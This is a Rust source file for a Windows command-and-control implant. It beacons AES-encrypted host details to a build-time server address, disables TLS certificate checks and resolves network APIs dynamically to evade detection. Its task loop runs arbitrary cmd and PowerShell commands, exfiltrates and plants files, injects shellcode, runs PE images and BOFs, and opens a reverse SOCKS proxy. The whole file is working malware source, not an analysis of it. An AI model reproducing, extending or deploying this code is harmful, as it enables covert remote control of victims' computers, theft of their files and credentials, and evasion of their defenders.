//TODO : add compile instructions here

//this example sends a post request with some specific headers and a json body
//it also ignores ssl errors

//allow "unreachable code" //this is because of our loops and their complexity.
#![allow(non_snake_case)]
#![allow(unused_assignments)]
#![allow(non_camel_case_types)]
#![allow(unused_variables)]
#![allow(unreachable_code)]

extern crate windows_sys as windows;

use serde::{Deserialize, Serialize};

use std::ffi::c_void;
use std::process::Command;

use windows::Win32::Networking::WinHttp::SECURITY_FLAG_IGNORE_UNKNOWN_CA;
use windows::Win32::Networking::WinInet::{
    InternetCloseHandle, INTERNET_FLAG_IGNORE_CERT_CN_INVALID,
    INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, INTERNET_FLAG_RELOAD, INTERNET_FLAG_SECURE,
    INTERNET_OPEN_TYPE_DIRECT, INTERNET_OPTION_SECURITY_FLAGS, INTERNET_SERVICE_HTTP,
    SECURITY_FLAG_IGNORE_WRONG_USAGE,
};
//use windows::Win32::System::Threading::Sleep;

use std::{
    ffi::{CString, OsStr},
    mem,
    os::windows::ffi::OsStrExt,
    ptr::null_mut,
};
// these are the only API calls we make using dependencies
use ntapi::{
    ntldr::{LdrGetDllHandle, LdrGetProcedureAddress},
    ntrtl::{RtlInitUnicodeString, RtlUnicodeStringToAnsiString},
};

use crate::func;
use client::{self as pivotclient, *};
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant, SystemTime};
use winapi::{
    ctypes::c_void as winapi_void,
    shared::{
        minwindef::{BOOL, FARPROC, HMODULE},
        ntdef::{HANDLE, STRING, UNICODE_STRING},
        ntstatus::STATUS_SUCCESS,
    },
};

//this is the struct that we will use to send our info to the server
#[derive(Serialize, Deserialize, Debug)]
pub struct ImpInfo {
    pub session: String,
    pub ip: String,
    pub username: String,
    pub domain: String,
    pub os: String,
    pub imp_pid: String,
    pub process_name: String,
    pub sleep: String,
}
//this is the struct that we will use to send our output to the server
#[derive(Serialize, Deserialize, Debug)]
struct OutputData {
    session: String,
    task_name: String,
    output: String,
}
#[derive(Serialize, Deserialize, Debug)]
pub struct SleepTime {
    sleep: String,
}

use_litcrypt!();

#[no_mangle]
pub extern "system" fn Pick() {
    //test litcrypt
    //this is for debugging
    //println!("his name is: {}", lc!("Megaman"));

    //get the teb, then get the base addresses of ntdll and kernel32, once, store, and use for all future calls

    let teb = noldr::get_teb();
    let ntdll_base = noldr::get_dll_address("ntdll.dll".to_string(), teb).unwrap();
    let kernel32_base = noldr::get_dll_address("kernel32.dll".to_string(), teb).unwrap();

    //this is where we will call functions to collect info for our ImpInfo struct

    //setup our variables.
    let mut imp_info = ImpInfo {
        //session: String::from(UUID), //have this pull the actual value later
        session: env!("UUID").to_string(), //ignore error in vs code, env is set
        ip: func::get_external_ip(),  //replace with real func::get_external_ip function
        username: func::get_username(),
        domain: func::get_system_domain(),
        os: func::get_version(ntdll_base),
        imp_pid: func::get_pid(),
        process_name: func::get_process_name(kernel32_base),
        //jitter: env!("JITTER").to_string(), //ignore error in vs code, env is set
        sleep: env!("SLEEP").to_string(), //ignore error in vs code, env is set
    };

    //print out our info to make sure it looks good
    //println!("Username: {}", imp_info.username);
    //println!("Hostname: {}", imp_info.hostname);
    //println!("IP: {}", imp_info.ip);
    //println!("OS: {}", imp_info.os);
    //println!("PID: {}", imp_info.imp_pid);
    //println!("Process Name: {}", imp_info.process_name);

    //print sleep from imp_info for debugging
    //println!("Sleep: {}", imp_info.sleep);

    //call our function to send the request
    send_request(imp_info);

    /*fn run_tasks(tasks: ?) -> ? {

        have a match tree for the task name to match up to send it to a function for that specific task,
        such as 'ls' to list directories and send to ls function here
        need to decide if we should send back any sort of task status, or just send the output of the task
        i also need to decide how to send the output of the task all the way back to the server so it can be displayed in the client
        i think i decided that I'll have a whole other API call here to a new endpoint,
        and the server will have a route for that endpoint that will take the output and display it in the client
        i think i'll have to make a new struct for the output, and then serialize it to json, and send it in the body of the request
        also could potentially have another sleep or delay here that could add some randomness to the checkin times

    } */

    fn run_tasks(
        tasks: String,
        server: String,
        imp_token: String,
        imp_info: &mut ImpInfo,
        mut jitter: &mut String,
    ) -> String {
        let mut output = String::new();

        for task in tasks.split(',') {
            //println!("[run_tasks] Received task: {}", task);

            //split arguments
            let arg_split = task.split(' ');
            let args = arg_split.collect::<Vec<&str>>();
            //match task.trim() {
            match args[0] {
                //uses the first argument to determine the task
                //not whoami in the terminal, but opsec safe version using dynamic loading of native functions
                "whoami" => {
                    output.push_str(&execute_whoami());
                }
                "ipconfig" => {
                    output.push_str(&func::get_network_info());
                }
                //list processes using dynamic loading of native functions
                "ps" => {
                    output.push_str(&process_list());
                }
                "cd" => {
                    output.push_str(&cd(args));
                }
                "pwd" => {
                    output.push_str(&pwd());
                }
                "ls" => {
                    output.push_str(&ls(args));
                }
                "catfile" => {
                    output.push_str(&catfile(args));
                }
                //add a function to "upload" files to server as base64 encoded strings of binary data
                "getfile" => {
                    output.push_str(&func::read_and_encode(args));
                }
                //add a function to "download" files from server as base64 encoded strings of binary data
                "sendfile" => {
                    output.push_str(&func::read_and_decode(args));
                }
                //add new tasks here
                //add a function to execute cmd commands
                "cmd" => {
                    output.push_str(&cmd(args));
                }
                //add a function to execute powershell commands
                "pwsh" => {
                    output.push_str(&pwsh(args));
                }
                "wmi" => {
                    output.push_str(&func::run_wmi_query(args));
                }
                //add a function to execute bofs
                "bof" => {
                    output.push_str(&func::read_and_exec(
                        args,
                        server.clone(),
                        imp_token.clone(),
                    ));
                }
                //add a function to inject shellcode into a process
                "inject" => {
                    output.push_str(&func::read_and_exshellcode(
                        args,
                        server.clone(),
                        imp_token.clone(),
                    ));
                }
                "runpe" => {
                    output.push_str(&func::read_and_runpe(
                        args,
                        server.clone(),
                        imp_token.clone(),
                    ));
                }
                //add a function to start a reverse socks proxy
                "socks" => {
                    output.push_str(&socks(args, server.clone()));
                }
                "sleep" => {
                    //add a function to change the sleep (and optionally also the jitter) time to a new value provided in the args
                    //this will be used to change the sleep time on the fly
                    output.push_str(&func::change_sleep(args, &mut imp_info.sleep, &mut jitter));
                }
                //add a function to kill the implant
                "kill" => {
                    output.push_str("killing implant...");
                    kill();
                }
                _ => {
                    //println!("[run_tasks] Unknown task: {}", task);
                    output.push_str(&format!("Unknown task: {}\n", task));
                }
            }
        }

        //if !output.is_empty() {
        //  println!("[run_tasks] Task output: {}", output);
        //}

        output
    }

    fn kill() {
        //kill the implant
        std::process::exit(0);
    }

    //tasks possible

    fn execute_whoami() -> String {
        whoami::get_username_ntapi().unwrap_or_else(|_| String::from("Unknown user"))
    }

    fn process_list() -> String {
        process_list::get_process_list()
    }

    // ... other task functions ...

    fn ls(args: Vec<&str>) -> String {
        let mut directory = ".";

        if args.len() > 1 {
            directory = args[1];
        }
        let read = std::fs::read_dir(directory);
        let mut output: Vec<String> = Vec::new();
        if read.is_ok() {
            for path in read.unwrap() {
                if let Ok(entry) = path {
                    // get more metadata and format correctly
                    // file and folder perms
                    if let Ok(metadata) = entry.metadata() {
                        output.push(String::from(format!(
                            "{:100}    {}",
                            entry.path().display(),
                            metadata.len()
                        )));
                    } else {
                        output.push(String::from(format!("{}", entry.path().display())));
                    }
                }
            }
        } else {
            //return String::from(format!("Could not ls: {:?}", read.err().unwrap()));
            //if the function fails, does this message get sent back to the server as output? it needs to...
            output.push(String::from(format!(
                "Could not ls: {:?}",
                read.err().unwrap()
            )));
        }

        output.join("\n")
    }

    //new task functions go here

    fn cd(args: Vec<&str>) -> String {
        let mut directory = ".";
        if args.len() > 1 {
            directory = args[1];
        }

        let read = std::env::set_current_dir(directory);
        if read.is_ok() {
            return String::from(format!("Changed directory to: {:?}", directory));
        } else {
            return String::from(format!(
                "Could not change directory: {:?}",
                read.err().unwrap()
            ));
        }
    }

    fn pwd() -> String {
        let read = std::env::current_dir();
        if read.is_ok() {
            return String::from(format!("Current directory: {:?}", read.unwrap().display()));
        } else {
            return String::from(format!(
                "Could not get current directory: {:?}",
                read.err().unwrap()
            ));
        }
    }

    fn catfile(args: Vec<&str>) -> String {
        let mut file = "";
        if args.len() > 1 {
            file = args[1];
        }
        let read = std::fs::read_to_string(file);
        if read.is_ok() {
            return read.unwrap();
        } else {
            return String::from(format!("Could not read file: {:?}", read.err().unwrap()));
        }
    }

    fn cmd(args: Vec<&str>) -> String {
        //capture the command from the args, which is in the 2nd position
        if args.len() > 1 {
            //if the command is more than one word, we need to join the args into a single string
            let command = args[1..].join(" ");
            // run cmd /c with the full command
            match Command::new("cmd").arg("/c").arg(&command).output() {
                Ok(output) => {
                    if !output.stderr.is_empty() {
                        //if command fails, return the error
                        String::from_utf8_lossy(&output.stderr).to_string()
                    } else {
                        //if command is successful, return the output
                        String::from_utf8_lossy(&output.stdout).to_string()
                    }
                }
                Err(_) => {
                    //if command fails to execute, return the error
                    String::from("Command failed to execute")
                }
            }
        } else {
            String::from("No command provided")
        }
    }

    fn pwsh(args: Vec<&str>) -> String {
        //capture the command from the args, which is in the 2nd position
        if args.len() > 1 {
            //if the command is more than one word, we need to join the args into a single string
            let command = args[1..].join(" ");
            //print for debugging
            //println!("Command: {}", command);
            // run powershell /c with the full command
            match Command::new("powershell").arg("/c").arg(command).output() {
                Ok(output) => {
                    if !output.stderr.is_empty() {
                        //if command fails, return the error
                        String::from_utf8_lossy(&output.stderr).to_string()
                    } else {
                        //if command is successful, return the output
                        String::from_utf8_lossy(&output.stdout).to_string()
                    }
                }
                Err(_) => {
                    //if command fails to execute, return the error
                    String::from("Command failed to execute")
                }
            }
        } else {
            String::from("No command provided")
        }
    }

    fn socks(args: Vec<&str>, server: String) -> String {
        if args.len() > 1 {
            let ip = server;
            //convert ip to a &str
            let ip = ip.as_str();

            let port = args[1];
            // Try to convert port to a u16
            let port = match port.parse::<u16>() {
                // If the conversion is successful, store the result in 'port'
                Ok(p) => p,
                // If there's an error, return a string indicating that the port is invalid
                Err(_) => return String::from("Invalid port"),
            };

            let mut auth_methods: Vec<u8> = Vec::new();
            auth_methods.push(pivotclient::AuthMethods::NoAuth as u8);

            let mut client = match MyClient::new(port, ip, auth_methods) {
                Ok(client) => client,
                Err(e) => return format!("Failed to create client: {:?}", e),
            };

            let (tx, rx) = mpsc::channel();

            let handle = thread::spawn(move || loop {
                match client.serve() {
                    Ok(_) => (),
                    Err(e) => {
                        tx.send(format!("Error: {:?}", e)).unwrap();
                        break;
                    }
                };
            });

            match rx.try_recv() {
                Ok(message) => message,
                Err(mpsc::TryRecvError::Empty) => String::from("SOCKS server started successfully"),
                Err(mpsc::TryRecvError::Disconnected) => String::from("Channel disconnected"),
            }
        } else {
            String::from("No IP and port provided")
        }
    }

    //send_request is the main request which sends back Impinfo, IIRC

    fn send_request(mut imp_info: ImpInfo) {
        loop {
            //starts the loop
            //this loop is to keep trying if we don't reach the server
            //if we reach the server, we enter an inner loop to keep checking for tasks
            //we only return to this loop if we fail to reach the server
            unsafe {
                //this is where we will setup our variables for the request
                //jitter is set as an env variable at compile time, by the server performing the build operation
                let mut jitter = env!("JITTER").to_string(); //ignore error in vs code, env is set
                                                             //TODO user agent should be randomized, but for now we will just use a static value
                let user_agent = CString::new("Mozilla/5.0").unwrap();

                /*
                the server name and port needs to be set by the SERVER when generating payloads, so this will be set as an env variable,
                which will trigger on the API call to build an implant using the Anvil server. if you need to compile this yourself,
                you can set the env variable in your terminal, or just hardcode it here
                */
                let server_name = env!("SERVER").to_string(); //ignore error in vs code, env is set
                let port = env!("PORT").to_string(); //ignore error in vs code, env is set

                //this is where we will setup our endpoints
                //TODO endpoints should be randomized, but for now we will just use static values
                //checkin endpoint is where we will send our ImpInfo struct
                let checkin_endpoint = CString::new("/js").unwrap();
                //index endpoint is where we will check for tasks
                let index_endpoint = CString::new("/index").unwrap();
                //this is where we will setup our method
                let method = CString::new("POST").unwrap();

                //dynamic load of InternetOpenA
                let module_name = ldr_get_dll("wininet.dll");
                let h_internet = ldr_get_fn(module_name, "InternetOpenA");

                //dynamic load of InternetConnectA
                let h_connect = ldr_get_fn(module_name, "InternetConnectA");

                //dynamic load of HttpOpenRequestA
                let h_checkin_request = ldr_get_fn(module_name, "HttpOpenRequestA");

                //dynamic load of InternetSetOptionA
                let h_set_option = ldr_get_fn(module_name, "InternetSetOptionA");

                //dynamic load of HttpSendRequestA
                let h_send_request = ldr_get_fn(module_name, "HttpSendRequestA");
                let h_index_request = ldr_get_fn(module_name, "HttpOpenRequestA");

                //dynamic load of InternetReadFile
                let h_read = ldr_get_fn(module_name, "InternetReadFile");

                //define the function signature for InternetOpenA
                type InternetOpenA =
                    unsafe extern "system" fn(*const i8, i32, *const i8, *const i8, u32) -> HANDLE;

                //define the function signature for InternetConnectA
                type InternetConnectA = unsafe extern "system" fn(
                    HANDLE,
                    *const i8,
                    u16,
                    *const i8,
                    *const i8,
                    i32,
                    u32,
                    u32,
                ) -> HANDLE;

                //define the function signature for HttpOpenRequestA
                type HttpOpenRequestA = unsafe extern "system" fn(
                    HANDLE,
                    *const i8,
                    *const i8,
                    *const i8,
                    *const i8,
                    *const i8,
                    u32,
                    u32,
                ) -> HANDLE;

                //define the function signature for InternetSetOptionA
                type InternetSetOptionA =
                    unsafe extern "system" fn(HANDLE, i32, *mut c_void, u32) -> BOOL;

                //define the function signature for HttpSendRequestA
                type HttpSendRequestA =
                    unsafe extern "system" fn(HANDLE, *const i8, i32, *mut c_void, u32) -> BOOL;

                //define the function signature for InternetReadFile
                type InternetReadFile =
                    unsafe extern "system" fn(HANDLE, *mut c_void, u32, *mut u32) -> BOOL;

                //transmute the function pointer to the correct type

                let h_internet: InternetOpenA = mem::transmute(h_internet);
                let h_connect: InternetConnectA = mem::transmute(h_connect);
                let h_checkin_request: HttpOpenRequestA = mem::transmute(h_checkin_request);
                let h_set_option: InternetSetOptionA = mem::transmute(h_set_option);
                let h_send_request: HttpSendRequestA = mem::transmute(h_send_request);
                let h_read: InternetReadFile = mem::transmute(h_read);
                let h_index_request: HttpOpenRequestA = mem::transmute(h_index_request);

                //call the function

                let h_internet_h = h_internet(
                    user_agent.as_ptr() as *const i8,
                    (INTERNET_OPEN_TYPE_DIRECT as i32).try_into().unwrap(),
                    null_mut(),
                    null_mut(),
                    0,
                );

                let h_connect_h = h_connect(
                    h_internet_h,
                    server_name.as_ptr() as *const i8,
                    port.parse::<u16>().unwrap(),
                    null_mut(),
                    null_mut(),
                    (INTERNET_SERVICE_HTTP as i32).try_into().unwrap(),
                    0,
                    0,
                );

                let h_checkin_request_h = h_checkin_request(
                    h_connect_h,
                    method.as_ptr() as *const i8,
                    checkin_endpoint.as_ptr() as *const i8,
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE,
                    0,
                );

                type c_ulong = u32;
                type DWORD = c_ulong;

                let mut flags: DWORD = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                    | SECURITY_FLAG_IGNORE_WRONG_USAGE
                    | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
                    | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

                h_set_option(
                    h_checkin_request_h,
                    (INTERNET_OPTION_SECURITY_FLAGS as i32).try_into().unwrap(),
                    &mut flags as *mut _ as *mut c_void,
                    std::mem::size_of_val(&flags) as u32,
                );

                let headers = CString::new(format!(
                    "X-Unique-Identifier: {}\r\nContent-Type: text/plain",
                    imp_info.session
                ))
                .unwrap();

                //add AES encryption here
                let serialized_data =
                    serde_json::to_string(&imp_info).expect("Failed to serialize output data");

                // Load the public key from the environment variable
                let encoded_aes_key = env!("AES_KEY");

                //base64 decode the aes key

                let aes_key = func::decode(encoded_aes_key).expect("Failed to decode AES key");
                //let aes_key_bytes = aes_key.as_bytes();

                // Initialize the AES encryption
                let cipher = Cipher::aes_256_cbc();
                let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
                let mut crypter = Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                    .expect("Failed to create Crypter");

                // Encrypt the data
                let mut encrypted_data = vec![0; serialized_data.len() + cipher.block_size()];
                let mut count = crypter
                    .update(serialized_data.as_bytes(), &mut encrypted_data)
                    .expect("Failed to encrypt data");
                count += crypter
                    .finalize(&mut encrypted_data[count..])
                    .expect("Failed to finalize encryption");

                // Truncate to the actual size of the encrypted data
                encrypted_data.truncate(count);

                let iv_clone = iv.clone();
                let encrypted_data_clone = encrypted_data.clone();

                // Print debug information
                //println!("IV: {:?}", iv_clone);
                //println!("Encrypted data length: {}", encrypted_data.len());
                //println!("Encrypted data: {:?}", encrypted_data_clone);

                // Base64 encode the encrypted data
                let base64_encrypted_data = func::encode(&encrypted_data);

                // Convert the encrypted data to a CString
                let request_body = CString::new(base64_encrypted_data)
                    .expect("Failed to create CString from encrypted data");

                /* previously unencrypted request body
                                let request_body = match serde_json::to_string(&imp_info) {
                                    Ok(json) => CString::new(json).unwrap(),
                                    Err(_) => {
                                        ////println!("Failed to serialize ImpInfo.");
                                        return;
                                    }
                                };
                */
                let res = h_send_request(
                    h_checkin_request_h,
                    headers.as_ptr() as *const i8,
                    -1isize as i32,
                    request_body.as_ptr() as *mut c_void,
                    request_body.to_bytes().len() as u32,
                );

                if res == 0 {
                    ////println!("Request failed.");
                } else {
                    ////println!("Request sent.");

                    //the json response will contain a token that we will use to make future requests
                    //store it as imp_token
                    let mut buffer = [0; 1024];
                    let mut bytes_read = 0;
                    let mut imp_token = String::new();

                    while h_read(
                        h_checkin_request_h,
                        buffer.as_mut_ptr() as *mut c_void,
                        buffer.len() as u32,
                        &mut bytes_read,
                    ) != 0
                        && bytes_read != 0
                    {
                        imp_token
                            .push_str(&String::from_utf8_lossy(&buffer[..bytes_read as usize]));
                        //println!("{}", imp_token);
                        //strip the quotes from the token
                        imp_token = imp_token.replace("\"", "");
                        //println!("{}", imp_token);
                    }

                    if imp_token.is_empty() {
                        //println!("Token is empty. Trying again in {} seconds.", SLEEP);
                        //Sleep((imp_info.sleep.parse::<u64>().unwrap() * 1000) as u32);
                        let start = Instant::now();

                        let sleep_duration_secs = imp_info.sleep.parse::<u64>().unwrap();

                        // Convert jitter from string to u64
                        let jitter = jitter.parse::<u64>().unwrap();

                        // Use system time to create a pseudo-random jitter percentage
                        let jitter_percentage = SystemTime::now()
                            .duration_since(SystemTime::UNIX_EPOCH)
                            .unwrap()
                            .as_secs() as u64
                            % jitter;

                        let jitter_amount = sleep_duration_secs * jitter_percentage / 100;
                        let sleep_duration =
                            Duration::from_secs(sleep_duration_secs + jitter_amount);

                        while start.elapsed() < sleep_duration {
                            std::thread::yield_now();
                        }
                        continue; //continues the outer loop
                    }

                    if !imp_token.is_empty() {
                        loop {
                            //starts the inner loop

                            let h_index_request_h = h_index_request(
                                h_connect_h,
                                method.as_ptr() as *const i8,
                                index_endpoint.as_ptr() as *const i8,
                                null_mut(),
                                null_mut(),
                                null_mut(),
                                INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE,
                                0,
                            );
                            //this is the request where we need to start also updating the sleep time with the server
                            // Set headers
                            let headers = CString::new(format!(
                                "X-Session: {}\r\nContent-Type: text/plain",
                                imp_token
                            ))
                            .unwrap();
                            //testing

                            //setup a struct to send the sleep time to the server
                            let sleep_time = SleepTime {
                                sleep: imp_info.sleep.clone(),
                            };

                            let serialized_data = serde_json::to_string(&sleep_time)
                                .expect("Failed to serialize output data");

                            // Load the public key from the environment variable
                            let encoded_aes_key = env!("AES_KEY");

                            //base64 decode the aes key

                            let aes_key =
                                func::decode(encoded_aes_key).expect("Failed to decode AES key");
                            //let aes_key_bytes = aes_key.as_bytes();

                            // Initialize the AES encryption
                            let cipher = Cipher::aes_256_cbc();
                            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
                            let mut crypter =
                                Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                                    .expect("Failed to create Crypter");

                            // Encrypt the data
                            let mut encrypted_data =
                                vec![0; serialized_data.len() + cipher.block_size()];
                            let mut count = crypter
                                .update(serialized_data.as_bytes(), &mut encrypted_data)
                                .expect("Failed to encrypt data");
                            count += crypter
                                .finalize(&mut encrypted_data[count..])
                                .expect("Failed to finalize encryption");

                            // Truncate to the actual size of the encrypted data
                            encrypted_data.truncate(count);

                            let iv_clone = iv.clone();
                            let encrypted_data_clone = encrypted_data.clone();

                            // Print debug information
                            //println!("IV: {:?}", iv_clone);
                            //println!("Encrypted data length: {}", encrypted_data.len());
                            //println!("Encrypted data: {:?}", encrypted_data_clone);

                            // Base64 encode the encrypted data
                            let base64_encrypted_data = func::encode(&encrypted_data);

                            // Convert the encrypted data to a CString
                            let request_body = CString::new(base64_encrypted_data)
                                .expect("Failed to create CString from encrypted data");

                                /* 
                            let request_body = match serde_json::to_string(&sleep_time) {
                                Ok(json) => CString::new(json).unwrap(),
                                Err(_) => {
                                    ////println!("Failed to serialize ImpInfo.");
                                    return;
                                }
                            };*/

                            // After constructing request_body
                            /* 
                            let request_body_str = request_body
                                .to_str()
                                .unwrap_or("Failed to convert request body to str");
                            println!("Request body: {}", request_body_str);
                            */

                            //if this fails, try to print the req body

                            h_set_option(
                                h_index_request_h,
                                (INTERNET_OPTION_SECURITY_FLAGS as i32).try_into().unwrap(),
                                &mut flags as *mut _ as *mut c_void,
                                std::mem::size_of_val(&flags) as u32,
                            );

                            let res = h_send_request(
                                h_index_request_h,
                                headers.as_ptr() as *const i8,
                                -1isize as i32,
                                request_body.as_ptr() as *mut c_void,
                                request_body.to_bytes().len() as u32,
                            );

                            if res == 0 {
                                //println!("Index request failed.");
                                //print res
                                //println!("Response: {}", res);
                            } else {
                                //println!("Index request sent.");
                                //the server will return a json containing tasks
                                let mut buffer = [0; 1024];
                                let mut bytes_read = 0;
                                let mut tasks = String::new();

                                while h_read(
                                    h_index_request_h,
                                    buffer.as_mut_ptr() as *mut c_void,
                                    buffer.len() as u32,
                                    &mut bytes_read,
                                ) != 0
                                    && bytes_read != 0
                                {
                                    tasks.push_str(&String::from_utf8_lossy(
                                        &buffer[..bytes_read as usize],
                                    ));
                                    // Strip the quotes from the tasks
                                    tasks = tasks.replace("\"", "");

                                    // Strip the brackets from the tasks
                                    tasks = tasks.replace("[", "").replace("]", "");

                                    tasks = unescape_backslashes(&tasks);

                                    // Check our fix
                                    //println!("Processed tasks: {}", tasks);
                                    // Clone tasks
                                    let sendtasks = tasks.clone();
                                    //clone for another operation cause im a derp
                                    let mut task_name = sendtasks.clone();
                                    //clone the server_name for sending to run_tasks for certain tasks
                                    let server_name_clone = server_name.clone();
                                    // Send the tasks to a function to parse and execute them
                                    // Add a check to make sure the tasks are not empty
                                    if !tasks.is_empty() {
                                        let output = run_tasks(
                                            sendtasks,
                                            server_name_clone,
                                            imp_token.clone(),
                                            &mut imp_info,
                                            &mut jitter,
                                        );
                                        //add a call here to send the output from run_tasks to the server for storage in db
                                        //println!("Printing output for debug: {}", output);

                                        //check task_name for bof and escape backslashes again if it contains bof
                                        if task_name.contains("bof") {
                                            task_name = unescape_backslashes(&task_name);
                                        }

                                        let output_data = OutputData {
                                            session: imp_token.clone(),   // Make sure imp_token is a String
                                            task_name: task_name.clone(), // Make sure task_name is a String
                                            output: output.clone(), // Make sure output is a String
                                        };

                                        //println!("task name before serialization: {}", task_name);
                                        //print output_data
                                        //println!("Output data: {:?}", output_data);

                                        let serialized_data = serde_json::to_string(&output_data)
                                            .expect("Failed to serialize output data");

                                        // Load the public key from the environment variable
                                        let encoded_aes_key = env!("AES_KEY");

                                        //base64 decode the aes key

                                        let aes_key = func::decode(encoded_aes_key)
                                            .expect("Failed to decode AES key");
                                        //let aes_key_bytes = aes_key.as_bytes();

                                        // Initialize the AES encryption
                                        let cipher = Cipher::aes_256_cbc();
                                        let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
                                        let mut crypter = Crypter::new(
                                            cipher,
                                            Mode::Encrypt,
                                            &aes_key,
                                            Some(&iv),
                                        )
                                        .expect("Failed to create Crypter");

                                        // Encrypt the data
                                        let mut encrypted_data =
                                            vec![0; serialized_data.len() + cipher.block_size()];
                                        let mut count = crypter
                                            .update(serialized_data.as_bytes(), &mut encrypted_data)
                                            .expect("Failed to encrypt data");
                                        count += crypter
                                            .finalize(&mut encrypted_data[count..])
                                            .expect("Failed to finalize encryption");

                                        // Truncate to the actual size of the encrypted data
                                        encrypted_data.truncate(count);

                                        let iv_clone = iv.clone();
                                        let encrypted_data_clone = encrypted_data.clone();

                                        // Print debug information
                                        //println!("IV: {:?}", iv_clone);
                                        //println!("Encrypted data length: {}", encrypted_data.len());
                                        //println!("Encrypted data: {:?}", encrypted_data_clone);

                                        // Base64 encode the encrypted data
                                        let base64_encrypted_data = func::encode(&encrypted_data);

                                        // Convert the encrypted data to a CString
                                        let request_body = CString::new(base64_encrypted_data)
                                            .expect("Failed to create CString from encrypted data");

                                        // Prepare the request body with the serialized data
                                        //let request_body = CString::new(serialized_data).unwrap();

                                        // Create the API call endpoint
                                        let return_out_endpoint =
                                            CString::new("/return_out").unwrap();

                                        // Open the HTTP request
                                        //if everything worked, you are now here

                                        let h_sendout_request_h = h_checkin_request(
                                            h_connect_h,
                                            method.as_ptr() as *const i8,
                                            return_out_endpoint.as_ptr() as *const i8,
                                            null_mut(),
                                            null_mut(),
                                            null_mut(),
                                            INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE,
                                            0,
                                        );

                                        // Set headers
                                        let headers =
                                            CString::new("Content-Type: text/plain\r\n")
                                                .unwrap();

                                        // Send the HTTP request with the JSON body

                                        let res = h_send_request(
                                            h_sendout_request_h,
                                            headers.as_ptr() as *const i8,
                                            -1isize as i32,
                                            request_body.as_ptr() as *mut c_void,
                                            request_body.to_bytes().len() as u32,
                                        );

                                        h_set_option(
                                            h_sendout_request_h,
                                            (INTERNET_OPTION_SECURITY_FLAGS as i32)
                                                .try_into()
                                                .unwrap(),
                                            &mut flags as *mut _ as *mut c_void,
                                            std::mem::size_of_val(&flags) as u32,
                                        );

                                        let res = h_send_request(
                                            h_sendout_request_h,
                                            headers.as_ptr() as *const i8,
                                            -1isize as i32,
                                            request_body.as_ptr() as *mut c_void,
                                            request_body.to_bytes().len() as u32,
                                        );

                                        if res == 0 {
                                            ////println!("Index request failed.");
                                        } else {
                                            //for now just check response code and print for debugging
                                            //actually, to avoid all that jazz, we will just print "we made it" and manually checck
                                            // the server db for our entry
                                            //println!("We made it.");
                                            continue;
                                        }

                                        // Handle response and errors as needed
                                        // ...

                                        //moving outside loop

                                        InternetCloseHandle(h_sendout_request_h as *const c_void);
                                        InternetCloseHandle(h_connect_h as *const c_void);
                                        InternetCloseHandle(h_internet_h as *const c_void);
                                    } else {
                                        continue;
                                    }
                                }

                                InternetCloseHandle(h_index_request_h as *const c_void);
                            }
                            //Sleep((imp_info.sleep.parse::<u64>().unwrap() * 1000) as u32);
                            let start = Instant::now();
                            let sleep_duration_secs = imp_info.sleep.parse::<u64>().unwrap();

                            // Convert jitter from string to u64
                            let jitter = jitter.parse::<u64>().unwrap();

                            // Use system time to create a pseudo-random jitter percentage
                            let jitter_percentage = SystemTime::now()
                                .duration_since(SystemTime::UNIX_EPOCH)
                                .unwrap()
                                .as_secs()
                                as u64
                                % jitter;

                            let jitter_amount = sleep_duration_secs * jitter_percentage / 100;
                            let sleep_duration =
                                Duration::from_secs(sleep_duration_secs + jitter_amount);

                            //print sleep duration for debug
                            //println!("Sleep Duration: {:?}", &sleep_duration);

                            while start.elapsed() < sleep_duration {
                                std::thread::yield_now();
                            }
                        } //end of inner loop
                        break; //breaks the outer loop
                               //warning for unreachable code is on this break, but obviously the if statement closes directly after, so it is not unreachable
                    }
                    InternetCloseHandle(h_checkin_request_h as *const c_void);
                    InternetCloseHandle(h_connect_h as *const c_void);
                    InternetCloseHandle(h_internet_h as *const c_void);
                }
            }
        } //end of outer loop
    } // end of send_request
} //end of pick function

// Function to unescape backslashes
fn unescape_backslashes(input: &str) -> String {
    input.replace("\\\\", "\\")
}
/*
fn unescape_backslashes2(input: &str) -> String {
    input.replace(r"\\", r"\")
}*/
//TODO these functions are also in func.rs. we should probably convert the rest of this file to call them from there
fn ldr_get_dll(dll_name: &str) -> HMODULE {
    let mut handle: *mut winapi_void = std::ptr::null_mut();
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let dll_name_wide: Vec<u16> = OsStr::new(dll_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        RtlInitUnicodeString(&mut unicode_string, dll_name_wide.as_ptr());
        let status = LdrGetDllHandle(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut unicode_string as *mut UNICODE_STRING,
            &mut handle,
        );
        if status != STATUS_SUCCESS || handle.is_null() {
            return std::ptr::null_mut();
        }
    }
    handle as HMODULE
}

fn ldr_get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    let mut func: *mut winapi_void = std::ptr::null_mut();
    let mut ansi_string = STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let fn_name_wide: Vec<u16> = OsStr::new(fn_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        RtlInitUnicodeString(&mut unicode_string, fn_name_wide.as_ptr());
        RtlUnicodeStringToAnsiString(&mut ansi_string, &unicode_string, 1);
        let status = LdrGetProcedureAddress(
            dll as *mut winapi_void,
            &mut ansi_string as *mut STRING,
            0,
            &mut func,
        );
        if status != STATUS_SUCCESS || func.is_null() {
            return std::ptr::null_mut();
        }
    }
    func as FARPROC
}

//new functions here
